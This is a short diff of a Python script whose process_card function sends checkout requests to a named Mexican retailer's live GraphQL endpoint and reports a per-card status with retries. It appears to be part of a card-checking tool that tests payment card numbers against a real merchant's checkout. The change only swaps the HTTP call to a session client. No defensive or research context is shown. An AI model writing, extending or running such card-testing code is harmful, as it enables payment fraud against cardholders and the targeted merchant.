@@ -137,7 +137,7 @@ async def process_card(card: str) -> str:
                 'operationName': 'getCheckout',
             }
 
-            response = requests.post('https://www.mimovil.com.mx/graphql-server/graphql', headers=headers, json=json_data)
+            response = c.post('https://www.mimovil.com.mx/graphql-server/graphql', headers=headers, json=json_data)
             responsePm = json.loads(response.text)
             
             checkout_id = responsePm["data"]["checkout"]["id"]
@@ -386,6 +386,7 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
 
